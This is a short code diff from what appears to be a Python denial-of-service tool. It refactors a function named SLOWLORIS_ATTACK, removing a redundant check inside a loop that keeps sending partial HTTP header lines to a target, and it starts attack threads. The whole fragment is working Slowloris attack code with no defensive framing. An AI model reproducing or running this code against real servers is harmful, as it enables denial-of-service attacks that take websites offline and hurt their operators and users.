@@ -32,14 +32,13 @@ def SLOWLORIS_ATTACK(threads, attack_time, target):
 		sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 
 		while not FINISH:
-			if not FINISH:
-				# Packet
-				try:
-					sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-				except socket.error:
-					print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to create socket!")
-				else:
-					print("\033[1;34m"+"[*]"+"\033[0m"+" Sending packets to " + target + "...")
+			# Packet
+			try:
+				sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+			except socket.error:
+				print("\033[1;31m"+"[-]"+"\033[0m"+" Failed to create socket!")
+			else:
+				print("\033[1;34m"+"[*]"+"\033[0m"+" Sending packets to " + target + "...")
 
 	# Start threads
 	for thread in range(0, threads):
